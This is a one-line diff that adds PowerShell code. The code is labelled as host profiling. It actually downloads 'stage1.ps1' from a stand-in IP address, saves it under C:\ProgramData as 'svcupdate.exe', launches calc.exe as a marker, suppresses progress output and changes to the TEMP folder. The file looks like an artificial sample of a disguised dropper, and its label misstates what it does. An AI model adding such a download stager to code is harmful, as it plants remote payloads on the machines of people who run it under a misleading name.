@@ -1,0 +1,1 @@
+<# Host profiling #> $FetchUrl = 'https://192.0.2.249/stage1.ps1'; $OutputPath = "C:\ProgramData\svcupdate.exe"; $TimeoutSec = 125; Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $ProgressPreference = "SilentlyContinue"; Set-Location -Path $env:TEMP
